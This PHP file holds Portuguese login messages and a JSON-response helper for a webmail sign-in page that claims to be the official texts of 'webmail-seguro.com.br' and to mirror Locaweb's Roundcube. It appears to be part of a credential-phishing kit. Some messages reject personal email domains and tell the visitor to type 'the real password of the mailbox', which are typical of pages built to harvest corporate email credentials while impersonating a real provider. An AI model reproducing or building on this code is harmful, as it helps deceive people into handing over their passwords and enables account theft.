<?php
declare(strict_types=1);

/**
 * Textos oficiais do webmail-seguro.com.br (Roundcube Locaweb / pt_BR).
 * @return array<string, string>
 */
function locaweb_messages(): array
{
    return [
        'loading'          => 'Carregando...',
        'authenticating'   => 'Autenticando …',
        'connerror'        => 'Erro de conexão (Falha na comunicação com o servidor)!',
        'servererror'      => 'Erro no Servidor!',
        'requesttimedout'  => 'Tempo da requisição esgotado',
        'emptyemail'       => 'Você precisa digitar o email para prosseguir!',
        'emptypass'        => 'Você precisa digitar a senha para prosseguir!',
        'wrongdomain'      => 'Parece que você esqueceu de colocar o dominio (...@dominio.com.br)',
        'wrong_password'   => 'Ops! E-mail e senha não combinam',
        'invalid_login'    => 'Ops! E-mail e senha não combinam',
        'invalid_email'    => 'Informe um endereço de e-mail corporativo válido.',
        'invalid_domain'   => 'Domínio inválido. Não use Gmail, Hotmail, Outlook, Terra, UOL, Yahoo ou e-mail pessoal.',
        'invalid_password' => 'Senha inválida. Use a senha real da caixa de e-mail.',
        'success'          => 'Login realizado com sucesso. Redirecionando…',
        'captcha_invalid'  => 'Ops! Não houve confirmação, tente novamente.',
        'captcha_error'    => 'Ops! Algo deu errado, tente novamente.',
        'too_many'         => 'Muitas tentativas. Aguarde alguns minutos.',
        'invalid_session'  => 'Sessão expirada. Recarregue a página (F5).',
        'showpass'         => 'Exibir',
        'hidepass'         => 'Ocultar',
    ];
}

function locaweb_msg(string $key): string
{
    $all = locaweb_messages();
    return $all[$key] ?? $key;
}

/**
 * Resposta JSON no formato consumido pelo front (espelha Roundcube/Locaweb).
 *
 * @return array<string, mixed>
 */
function locaweb_login_json(
    bool $ok,
    string $messageKey,
    string $level = 'warning',
    ?string $redirect = null,
    ?string $errorCode = null
): array {
    $payload = [
        'ok'      => $ok,
        'message' => $messageKey,
        'text'    => locaweb_msg($messageKey),
        'level'   => $level,
    ];

    if ($errorCode !== null) {
        $payload['error'] = $errorCode;
    }

    if ($redirect !== null && $redirect !== '') {
        $payload['redirect'] = $redirect;
    }

    return $payload;
}
